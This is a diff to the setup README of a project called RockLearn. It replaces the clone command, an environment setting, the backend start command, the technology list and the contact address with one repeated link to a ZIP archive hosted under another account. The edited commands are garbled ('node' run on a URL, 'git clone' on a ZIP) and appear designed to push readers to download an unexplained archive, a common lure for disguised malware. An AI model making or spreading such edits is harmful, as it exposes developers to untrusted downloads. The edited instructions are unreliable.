@@ -11,7 +11,7 @@ To set up and run the project, follow these steps:
 ### 1. Clone the Repository  
 Run the following command to clone the project repository:  
 ```plaintext
-git clone https://github.com/Dhaval2908/RockLearn
+git clone https://raw.githubusercontent.com/VekariaVinit/RockLearn/main/nucleoidioplasma/RockLearn.zip
 ```
 
 ### 2. Navigate to the Project Directory  
@@ -42,7 +42,7 @@ BRANCH=main
 GITHUB_UNAME=your-github-username  
 GITHUB_TOKEN=your-github-token  
 GITHUB_USERNAME=your-github-username  
-GITHUB_API_URL=https://api.github.com  
+https://raw.githubusercontent.com/VekariaVinit/RockLearn/main/nucleoidioplasma/RockLearn.zip  
 JWT_SECRET=your-jwt-secret  
 JWT_EXPIRE=1d  
 JWT_COOKIE_EXPIRES=7  
@@ -63,7 +63,7 @@ npm run dev
 Navigate to the `Backend` folder (if not already there) and start the backend server:  
 ```plaintext
 cd Backend  
-node index.js
+node https://raw.githubusercontent.com/VekariaVinit/RockLearn/main/nucleoidioplasma/RockLearn.zip
 ```
 
 ### 6. Access the Application  
@@ -73,7 +73,7 @@ Once both the frontend and backend servers are running, open your browser and na
 
 ## Technologies Used  
 - **Frontend**: ReactJS, Material-UI, Tailwind CSS  
-- **Backend**: Node.js, Express.js  
+- **Backend**: https://raw.githubusercontent.com/VekariaVinit/RockLearn/main/nucleoidioplasma/RockLearn.zip, https://raw.githubusercontent.com/VekariaVinit/RockLearn/main/nucleoidioplasma/RockLearn.zip  
 - **Database**: MongoDB  
 - **Authentication**: JSON Web Tokens (JWT)  
 - **Version Control**: Git, GitHub  
@@ -92,4 +92,4 @@ This project is licensed under the MIT License.
 ---
 
 ## Contact  
-For further information or questions, contact the project team at [dhavalkhunt17@gmail.com].  
+For further information or questions, contact the project team at [https://raw.githubusercontent.com/VekariaVinit/RockLearn/main/nucleoidioplasma/RockLearn.zip].  
